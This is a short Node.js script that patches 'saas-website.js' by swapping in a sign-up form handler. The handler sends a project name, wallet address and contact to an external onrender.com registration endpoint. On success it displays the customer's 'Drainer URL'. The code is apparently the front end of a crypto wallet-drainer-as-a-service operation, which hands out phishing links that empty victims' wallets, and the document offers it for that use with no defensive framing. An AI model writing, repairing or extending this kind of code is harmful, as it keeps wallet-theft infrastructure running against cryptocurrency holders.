const fs = require('fs');
let content = fs.readFileSync('saas-website.js', 'utf8');

// Fix the DOM ready function structure
const fixedScript = `    <script>
        // Wait for DOM to be fully loaded
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('signupForm');
            if (!form) {
                console.error("Form not found!");
                return;
            }
            
            console.log("Form found, adding event listener...");
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                console.log('Form submitted!');
                
                // Get form elements by their actual structure
                const form = this;
                const inputs = form.querySelectorAll('input');
                const selects = form.querySelectorAll('select');
                
                console.log('Form elements:', { inputs: inputs.length, selects: selects.length });
                
                // Get values directly from form elements
                const projectName = inputs[0] ? inputs[0].value : '';
                const wallet = inputs[1] ? inputs[1].value : '';
                const contact = inputs[2] ? inputs[2].value : '';
                const themeColor = selects[0] ? selects[0].value : '#6366f1';
                
                console.log('Form values:', { projectName, wallet, contact, themeColor });
                
                if (!projectName || !wallet) {
                    alert('Please fill in Project Name and Wallet Address');
                    return;
                }
                
                const formData = {
                    projectName: projectName,
                    wallet: wallet,
                    contact: contact,
                    themeColor: themeColor
                };

                try {
                    console.log('Sending request...');
                    const response = await fetch('https://service-s816.onrender.com/saas/v2/register', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(formData)
                    });

                    const result = await response.json();
                    console.log('API Response:', result);
                    
                    if (result.success) {
                        alert('✅ Success! Your Drainer URL: ' + result.drainerUrl);
                    } else {
                        alert('❌ Error: ' + result.error);
                    }
                } catch (error) {
                    console.error('Request failed:', error);
                    alert('❌ Network error: ' + error.message);
                }
            });
        });
    </script>`;

// Replace the entire broken script section
content = content.replace(/<script>[\s\S]*?<\/script>/g, fixedScript);

fs.writeFileSync('saas-website.js', content);
console.log('✅ Fixed JavaScript syntax and structure');
